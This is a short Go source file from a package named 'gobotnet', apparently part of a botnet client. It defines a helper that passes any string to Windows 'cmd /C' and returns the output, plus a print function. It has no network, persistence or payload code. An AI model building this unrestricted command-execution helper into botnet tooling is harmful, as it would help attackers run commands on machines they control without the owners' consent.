package gobotnet

import (
	"fmt"
	"os/exec"
)

func CmdExec(cmd string) ([]byte, error) {
	return exec.Command("cmd", "/C", cmd).Output()
}

func OutMessage(message string) {
	fmt.Println(message)
}
